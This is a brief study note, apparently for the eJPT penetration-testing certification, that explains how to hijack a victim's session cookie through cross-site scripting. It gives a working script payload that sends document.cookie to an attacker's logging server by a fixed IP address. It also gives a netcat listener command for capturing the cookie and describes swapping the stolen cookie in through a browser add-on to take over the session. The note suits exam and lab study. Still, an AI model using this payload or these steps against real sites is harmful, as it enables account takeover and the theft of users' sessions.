[eJPT]Hijack Cookie through XSS


There are four components as follows:
- Attacker Client PC
- Attacker Logging Server
- Vulnerable Server
- Victim Client PC


1) Attacker: first finds a Vulnerable Server and its breach point.

2) Attacker: enter the following snippet in order to hijack the cookie kepts by Victim Client PC (P.S.: the IP address, 192.168.99.102, belongs to Attacker Logging Server in this example):
<script>var i = new Image();i.src="http://192.168.99.102/log.php?q="+document.cookie;</script>

3) Attacker: log into Attacker Logging Server (P.S.: it is 192.168.99.102 in this example), and execute the following command:
#nc -vv -k -l -p 80

4) Attacker: when Victim Client PC browses the Vulnerable Server, check the output of the command above.

5) Attacker: after obtaining the victim's cookie, utilize a FireFox's Add-On called Cookie Quick Manager to change to the victim's cookie in an effort to hijack the victim's privilege.
